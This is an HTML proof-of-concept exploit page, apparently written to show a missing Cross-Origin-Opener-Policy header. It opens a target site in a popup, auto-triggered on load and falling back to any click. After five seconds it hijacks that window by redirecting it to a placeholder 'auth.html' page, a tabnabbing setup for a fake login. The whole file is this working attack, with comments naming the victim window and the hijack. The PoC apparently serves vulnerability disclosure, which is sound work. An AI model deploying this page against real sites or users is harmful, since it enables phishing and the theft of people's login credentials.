<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>POC</title>
  <style>
    body { margin: 0; background: white; cursor: pointer; }
    #msg {
      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
      font-family: sans-serif; color: #aaa; font-size: 14px; text-align: center;
    }
  </style>
</head>
<body onclick="openTarget()">
  <div id="msg">If the site did not automatically redirect to the target, click anywhere in the white background.</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const target = params.get('target');
  let win;
  let redirectTimer;

  function openTarget() {
    if (!target) return;

    win = window.open(target, 'victimWindow');

    // If popup was blocked, win may be null or blocked
    if (!win || win.closed || typeof win.closed === 'undefined') {
      document.getElementById('msg').textContent =
        'Popup was blocked. Please click anywhere to continue the demonstration.';
      return;
    }

    document.getElementById('msg').style.display = 'none';

    // Give the target page time to load before hijacking
    redirectTimer = setTimeout(navigateAway, 5000);
  }

  function navigateAway() {
    if (win && !win.closed) {
      try {
        win.location = 'https://<username>.github.io/<repo-name>/auth.html';
      } catch (e) {
        // COOP is set — cross-origin navigation blocked (expected if fixed)
        document.getElementById('msg').textContent =
          'Navigation blocked — COOP header is properly configured.';
        document.getElementById('msg').style.display = 'block';
      }
    }
  }

  // Auto-trigger on load
  window.onload = () => setTimeout(openTarget, 1500);
</script>
</body>
</html>
